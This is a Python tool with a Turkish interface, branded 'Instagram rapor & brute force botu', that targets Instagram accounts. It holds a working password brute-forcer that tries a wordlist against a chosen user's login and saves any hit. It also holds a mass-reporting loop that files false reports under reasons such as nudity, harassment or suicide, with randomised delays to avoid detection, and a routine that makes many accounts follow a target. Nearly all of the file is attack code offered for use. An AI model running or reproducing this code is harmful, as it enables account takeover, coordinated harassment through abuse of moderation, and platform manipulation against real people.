import time
import requests
import re
import random
import os
import json
from getpass import getpass
from colorama import Fore, Style, init
init(autoreset=True)

LOGIN_URL = "https://www.instagram.com/accounts/login/ajax/"
USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 Edg/125.0.0.0"

class InstagramReporter:
    def __init__(self):
        self.session = requests.Session()
        self.csrf_token = ""
        self.report_reasons = {
            "1": 1, "2": 3, "3": 4, "4": 5, "5": 6, "6": 7, "7": 8, "8": 9
        }

    def print_colorful_banner(self):
        os.system('cls' if os.name == 'nt' else 'clear')
        colors = [Fore.RED, Fore.GREEN, Fore.YELLOW, Fore.BLUE, Fore.MAGENTA, Fore.CYAN]
        banner = r"""
    █████╗ ██████╗ ██╗██╗   ██╗ █████╗
    ██╔══██╗██╔══██╗██║██║   ██║██╔══██╗
    ███████║██████╔╝██║██║   ██║███████║
    ██╔══██║██╔══██╗██║╚██╗ ██╔╝██╔══██║
    ██║  ██║██║  ██║██║ ╚████╔╝ ██║  ██║
    ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝  ╚═╝  ╚═╝
        """
        colorful_banner = ""
        for line in banner.split('\n'):
            colorful_line = ""
            for char in line:
                colorful_line += random.choice(colors) + char
            colorful_banner += colorful_line + "\n"
        print(colorful_banner)
        print(Fore.CYAN + "    ═════════════════════════════════")
        print(Fore.YELLOW + "    [✓] v5.3 " + Fore.WHITE + "TELEGRAM: " + Fore.CYAN + "t.me/siberdunyaniz")
        print(Fore.RED + "    🔥 " + Fore.WHITE + "INSTAGRAM RAPOR & BRUTE FORCE BOTU " + Fore.RED + "🔥\n")

    def bruteforce_login(self):
        self.print_colorful_banner()
        print(Fore.YELLOW + "╔════════════════════════════╗")
        print(Fore.YELLOW + "║     " + Fore.CYAN + "BRUTE FORCE GİRİŞ" + Fore.YELLOW + "     ║")
        print(Fore.YELLOW + "╚════════════════════════════╝\n")
        username = input(Fore.MAGENTA + "[?] " + Fore.WHITE + "Hedef Kullanıcı Adı ➜ ")
        passwords_file = input(Fore.MAGENTA + "[?] " + Fore.WHITE + "Şifreler Dosyası (şifreler.txt) ➜ ").strip()
        try:
            with open(passwords_file, 'r', encoding='utf-8') as file:
                passwords = [line.strip() for line in file if line.strip()]
        except FileNotFoundError:
            print(Fore.RED + f"❌ Dosya bulunamadı: {passwords_file}")
            return
        except Exception as e:
            print(Fore.RED + f"❌ Dosya okuma hatası: {str(e)}")
            return
        print(Fore.YELLOW + f"\n🔍 Toplam {len(passwords)} şifre deneniyor...")
        successful_login = None
        for i, password in enumerate(passwords, 1):
            try:
                self.session = requests.Session()
                self.session.get("https://www.instagram.com/", headers={"User-Agent": USER_AGENT})
                self.csrf_token = self.session.cookies.get("csrftoken", "")
                login_data = {
                    "username": username,
                    "enc_password": f"#PWD_INSTAGRAM_BROWSER:0:{int(time.time())}:{password}",
                    "queryParams": "{}",
                    "optIntoOneTap": "false",
                    "trustedDeviceRecords": "{}"
                }
                login_headers = {
                    "User-Agent": USER_AGENT,
                    "X-CSRFToken": self.csrf_token,
                    "X-Instagram-AJAX": "1",
                    "X-IG-App-ID": "936619743392459",
                    "Content-Type": "application/x-www-form-urlencoded",
                    "Referer": "https://www.instagram.com/",
                    "X-Requested-With": "XMLHttpRequest"
                }
                response = self.session.post(LOGIN_URL, data=login_data, headers=login_headers)
                response_json = response.json()
                if response_json.get("authenticated", False):
                    print(Fore.GREEN + f"\n✅ Giriş Başarılı!")
                    print(Fore.GREEN + f"Kullanıcı Adı: {username}\nŞifre: {password}")
                    successful_login = password
                    break
                else:
                    print(Fore.RED + f"[{i}/{len(passwords)}] ❌ Başarısız - {password}")
                if i % 5 == 0:
                    delay = random.randint(3, 7)
                    print(Fore.YELLOW + f"⏳ {delay} saniye bekleniyor...")
                    time.sleep(delay)
            except Exception as e:
                print(Fore.RED + f"Hata: {str(e)}")
                time.sleep(2)
        if successful_login:
            try:
                with open("basarili_girisi.txt", "a", encoding="utf-8") as f:
                    f.write(f"Kullanıcı Adı: {username}\nŞifre: {successful_login}\n\n")
                print(Fore.GREEN + "Sonuç kaydedildi: basarili_girisi.txt")
            except Exception as e:
                print(Fore.RED + f"Kaydetme hatası: {str(e)}")
        else:
            print(Fore.RED + "\n❌ Hiçbir şifre başarılı olmadı!")

    def get_media_id(self, url):
        try:
            response = self.session.get(url, headers={"User-Agent": USER_AGENT})
            media_id = re.search(r'"media_id":"(\d+)"', response.text)
            return media_id.group(1) if media_id else None
        except Exception as e:
            print(Fore.RED + f"Media ID alınamadı: {str(e)}")
            return None

    def get_user_id(self, username):
        try:
            response = self.session.get(
                f"https://www.instagram.com/api/v1/users/web_profile_info/?username={username}",
                headers={"User-Agent": USER_AGENT, "X-IG-App-ID": "936619743392459"}
            )
            return response.json()['data']['user']['id']
        except Exception as e:
            print(Fore.RED + f"Kullanıcı ID alınamadı: {str(e)}")
            return None

    def get_headers(self, referer=None):
        headers = {
            "User-Agent": USER_AGENT,
            "X-CSRFToken": self.csrf_token,
            "X-IG-App-ID": "936619743392459",
            "X-ASBD-ID": "129703",
            "X-IG-WWW-Claim": "0",
            "X-Requested-With": "XMLHttpRequest",
            "Origin": "https://www.instagram.com",
            "Referer": "https://www.instagram.com/",
            "Accept": "*/*",
            "Content-Type": "application/x-www-form-urlencoded",
            "X-Instagram-AJAX": "1",
            "X-XSRF-TOKEN": self.csrf_token
        }
        if referer:
            headers["Referer"] = referer
        return headers

    def report_content(self, target_url, reason_id, report_type, media_id=None, user_id=None):
        try:
            if report_type == 1:
                if media_id is None:
                    media_id = self.get_media_id(target_url)
                if not media_id:
                    print(Fore.RED + "Media ID bulunamadı!")
                    return False
                endpoint = f"https://www.instagram.com/api/v1/media/{media_id}/flag/"
                data = {
                    "media_id": media_id,
                    "reason_id": reason_id,
                    "frx_context": "",
                    "session_id": self.session.cookies.get("sessionid")
                }
            elif report_type == 2:
                if not user_id:
                    username = target_url.split("instagram.com/")[1].split("/")[0]
                    user_id = self.get_user_id(username)
                if not user_id:
                    print(Fore.RED + "Kullanıcı ID bulunamadı!")
                    return False
                endpoint = "https://www.instagram.com/api/v1/users/web_report/"
                data = {
                    "user_id": user_id,
                    "reason_id": reason_id,
                    "frx_context": "",
                    "session_id": self.session.cookies.get("sessionid")
                }
            else:
                print(Fore.RED + "Geçersiz rapor türü!")
                return False
            headers = self.get_headers(target_url)
            response = self.session.post(endpoint, data=json.dumps(data), headers=headers)
            print(Fore.YELLOW + f"Rapor Yanıtı - Durum Kodu: {response.status_code}")
            print(Fore.YELLOW + f"Yanıt İçeriği: {response.text}")
            return response.status_code == 200
        except Exception as e:
            print(Fore.RED + f"Rapor Gönderme Hatası: {str(e)}")
            return False

    def send_reports(self):
        self.print_colorful_banner()
        print(Fore.RED + "╔════════════════════════════╗")
        print(Fore.RED + "║   " + Fore.CYAN + "INSTAGRAM RAPOR SİSTEMİ" + Fore.RED + "   ║")
        print(Fore.RED + "╚════════════════════════════╝\n")
        print(Fore.YELLOW + "Rapor Türünü Seçin:")
        print(Fore.CYAN + "1. Gönderi/Reels Raporu\n2. Profil Raporu")
        report_type = int(input(Fore.MAGENTA + "[?] " + Fore.WHITE + "Seçim ➜ "))
        target_url = input(Fore.MAGENTA + "[?] " + Fore.WHITE + "Hedef Gönderi/Profil URL ➜ ").strip()
        report_count = int(input(Fore.MAGENTA + "[?] " + Fore.WHITE + "Rapor Sayısı ➜ "))
        reason_id = self.select_report_reason()
        media_id = None
        user_id = None

        if report_type == 1:
            if "/p/" not in target_url and "/reel/" not in target_url:
                print(Fore.RED + "Geçersiz gönderi/reels URL'si!")
                return
            manual_media = input(Fore.MAGENTA + "[?] " + Fore.WHITE + "Media ID'yi el ile girmek istiyor musunuz? (E/H) ➜ ").lower()
            if manual_media == 'e':
                media_id = input(Fore.MAGENTA + "[?] " + Fore.WHITE + "Media ID'yi girin ➜ ").strip()
            else:
                media_id = self.get_media_id(target_url)
                if not media_id:
                    print(Fore.RED + "Media ID alınamadı!")
                    return
        elif report_type == 2:
            manual_user = input(Fore.MAGENTA + "[?] " + Fore.WHITE + "Kullanıcı ID'yi el ile girmek istiyor musunuz? (E/H) ➜ ").lower()
            if manual_user == 'e':
                user_id = input(Fore.MAGENTA + "[?] " + Fore.WHITE + "Kullanıcı ID'yi girin ➜ ").strip()
                if not user_id.isdigit():
                    print(Fore.RED + "Geçersiz Kullanıcı ID! Sadece sayısal değer girilmeli.")
                    return
            else:
                username = target_url.split("instagram.com/")[1].split("/")[0]
                user_id = self.get_user_id(username)
                if not user_id:
                    print(Fore.RED + "Kullanıcı ID alınamadı!")
                    return

        success = 0
        for attempt in range(1, report_count + 1):
            try:
                result = self.report_content(target_url, reason_id, report_type, media_id, user_id)
                if result:
                    print(Fore.GREEN + f"[{attempt}/{report_count}] ✅ Başarılı!")
                    success += 1
                    self.handle_cooldown(attempt)
                else:
                    print(Fore.RED + f"[{attempt}/{report_count}] ❌ Başarısız")
                    self.handle_failure_cooldown()
            except Exception as e:
                print(Fore.RED + f"İşlem Hatası: {str(e)}")
                self.handle_failure_cooldown()
        print(Fore.CYAN + f"\n🔥 Toplam {success}/{report_count} rapor gönderildi!")
        input(Fore.YELLOW + "\n⏎ Devam etmek için Enter'a bas...")

    def handle_cooldown(self, attempt):
        if attempt % 5 == 0:
            delay = random.randint(180, 300)
            print(Fore.YELLOW + f"⏳ {delay//60} dakika bekleme...")
            time.sleep(delay)
        else:
            time.sleep(random.uniform(15, 45))

    def handle_failure_cooldown(self):
        time.sleep(random.randint(60, 120))

    def select_report_reason(self):
        print(Fore.YELLOW + "\n╔════════════════════════════╗")
        print(Fore.YELLOW + "║       " + Fore.CYAN + "RAPOR SEBEBİ" + Fore.YELLOW + "       ║")
        print(Fore.YELLOW + "╠════════════════════════════╣")
        print(Fore.CYAN + "║ 1. Spam                   ║\n║ 2. Çıplaklık             ║\n║ 3. Taciz                 ║\n║ 4. Nefret Söylemi        ║\n║ 5. Şiddet                ║\n║ 6. İntihar               ║\n║ 7. Yanlış Bilgi          ║\n║ 8. Yasadışı Satış        ║")
        print(Fore.YELLOW + "╚════════════════════════════╝")
        return self.report_reasons.get(input(Fore.MAGENTA + "\n[?] " + Fore.WHITE + "Seçim ➜ "), 1)

    def login(self):
        self.print_colorful_banner()
        print(Fore.YELLOW + "╔════════════════════════════╗")
        print(Fore.YELLOW + "║      " + Fore.CYAN + "GİRİŞ PANELİ" + Fore.YELLOW + "       ║")
        print(Fore.YELLOW + "╚════════════════════════════╝\n")
        username = input(Fore.MAGENTA + "[?] " + Fore.WHITE + "Kullanıcı Adı ➜ ")
        password = getpass(Fore.MAGENTA + "[?] " + Fore.WHITE + "Şifre ➜ ")
        try:
            self.session.get("https://www.instagram.com/", headers={"User-Agent": USER_AGENT})
            self.csrf_token = self.session.cookies.get("csrftoken", "")
            login_data = {
                "username": username,
                "enc_password": f"#PWD_INSTAGRAM_BROWSER:0:{int(time.time())}:{password}",
                "queryParams": "{}",
                "optIntoOneTap": "false",
                "trustedDeviceRecords": "{}"
            }
            login_headers = {
                "User-Agent": USER_AGENT,
                "X-CSRFToken": self.csrf_token,
                "X-Instagram-AJAX": "1",
                "X-IG-App-ID": "936619743392459",
                "Content-Type": "application/x-www-form-urlencoded",
                "Referer": "https://www.instagram.com/",
                "X-Requested-With": "XMLHttpRequest"
            }
            response = self.session.post(LOGIN_URL, data=login_data, headers=login_headers)
            response_json = response.json()
            if response_json.get("authenticated", False):
                print(Fore.GREEN + "\n✅ Giriş Başarılı!")
                return True
            else:
                print(Fore.RED + "\n❌ Giriş Başarısız!")
                return False
        except Exception as e:
            print(Fore.RED + f"\n⚠ Hata: {str(e)}")
            return False

    def login_with_credentials(self, username, password):
        try:
            self.session.get("https://www.instagram.com/", headers={"User-Agent": USER_AGENT})
            self.csrf_token = self.session.cookies.get("csrftoken", "")
            login_data = {
                "username": username,
                "enc_password": f"#PWD_INSTAGRAM_BROWSER:0:{int(time.time())}:{password}",
                "queryParams": "{}",
                "optIntoOneTap": "false",
                "trustedDeviceRecords": "{}"
            }
            login_headers = {
                "User-Agent": USER_AGENT,
                "X-CSRFToken": self.csrf_token,
                "X-Instagram-AJAX": "1",
                "X-IG-App-ID": "936619743392459",
                "Content-Type": "application/x-www-form-urlencoded",
                "Referer": "https://www.instagram.com/",
                "X-Requested-With": "XMLHttpRequest"
            }
            response = self.session.post(LOGIN_URL, data=login_data, headers=login_headers)
            response_json = response.json()
            if response_json.get("authenticated", False):
                return True
            return False
        except Exception:
            return False

    def follow_account(self):
        self.print_colorful_banner()
        print(Fore.RED + "╔════════════════════════════╗")
        print(Fore.RED + "║   " + Fore.CYAN + "TAKİPÇİ BASMA SİSTEMİ" + Fore.RED + "   ║")
        print(Fore.RED + "╚════════════════════════════╝\n")

        csrf_token = input(Fore.MAGENTA + "[?] " + Fore.WHITE + "CSRF Token ➜ ").strip()
        accounts_file = input(Fore.MAGENTA + "[?] " + Fore.WHITE + "Hesaplar Dosyası (hesaplar.txt) ➜ ").strip()
        interval = int(input(Fore.MAGENTA + "[?] " + Fore.WHITE + "İşlem Aralığı (saniye cinsinden) ➜ "))
        target_user_id = input(Fore.MAGENTA + "[?] " + Fore.WHITE + "Takip Edilecek Hesabın Kullanıcı ID'si ➜ ").strip()

        if not target_user_id.isdigit():
            print(Fore.RED + "❌ Geçersiz Kullanıcı ID! Sadece sayısal değer girilmeli.")
            return

        try:
            with open(accounts_file, 'r', encoding='utf-8') as file:
                accounts = [line.strip().split(':') for line in file if line.strip()]
                if not all(len(acc) == 2 for acc in accounts):
                    print(Fore.RED + "❌ Hata: Txt dosyası 'kullanıcıadı:şifre' formatında olmalı!")
                    return
        except FileNotFoundError:
            print(Fore.RED + f"❌ Dosya bulunamadı: {accounts_file}")
            return
        except Exception as e:
            print(Fore.RED + f"❌ Dosya okuma hatası: {str(e)}")
            return

        print(Fore.YELLOW + f"\n🔍 Toplam {len(accounts)} hesap ile kullanıcı ID {target_user_id} takip edilecek...")

        success_count = 0
        for i, (username, password) in enumerate(accounts, 1):
            print(Fore.CYAN + f"\n[{i}/{len(accounts)}] {username} ile işlem başlıyor...")
            try:
                self.session = requests.Session()
                self.csrf_token = csrf_token

                if not self.login_with_credentials(username, password):
                    print(Fore.RED + f"❌ {username} ile giriş başarısız!")
                    continue

                follow_endpoint = f"https://www.instagram.com/api/v1/friendships/create/{target_user_id}/"
                headers = self.get_headers(referer=f"https://www.instagram.com/p/{target_user_id}/")
                response = self.session.post(follow_endpoint, headers=headers)
                
                if response.status_code == 200 and response.json().get("status") == "ok":
                    print(Fore.GREEN + f"✅ {username} ile kullanıcı ID {target_user_id} takip edildi!")
                    success_count += 1
                else:
                    print(Fore.RED + f"❌ Takip başarısız! Durum Kodu: {response.status_code}")

                if i < len(accounts):
                    print(Fore.YELLOW + f"⏳ {interval} saniye bekleniyor...")
                    time.sleep(interval)

            except Exception as e:
                print(Fore.RED + f"⚠ Hata: {str(e)}")
                time.sleep(5)

        print(Fore.CYAN + f"\n🔥 Toplam {success_count}/{len(accounts)} hesap ile takip edildi!")
        input(Fore.YELLOW + "\n⏎ Devam etmek için Enter'a bas...")

    def start(self):
        self.print_colorful_banner()
        print(Fore.YELLOW + "╔════════════════════════════╗")
        print(Fore.YELLOW + "║        " + Fore.CYAN + "ANA MENÜ" + Fore.YELLOW + "        ║")
        print(Fore.YELLOW + "╚════════════════════════════╝")
        print(Fore.CYAN + "║ 1. Rapor Gönder           ║\n║ 2. Brute Force Girişi     ║\n║ 3. Takipçi Basma          ║")
        choice = input(Fore.MAGENTA + "\n[?] " + Fore.WHITE + "Seçim ➜ ")
        if choice == "1":
            if self.login():
                self.send_reports()
        elif choice == "2":
            self.bruteforce_login()
        elif choice == "3":
            self.follow_account()
        else:
            print(Fore.RED + "Geçersiz seçim!")

if __name__ == "__main__":
    InstagramReporter().start()
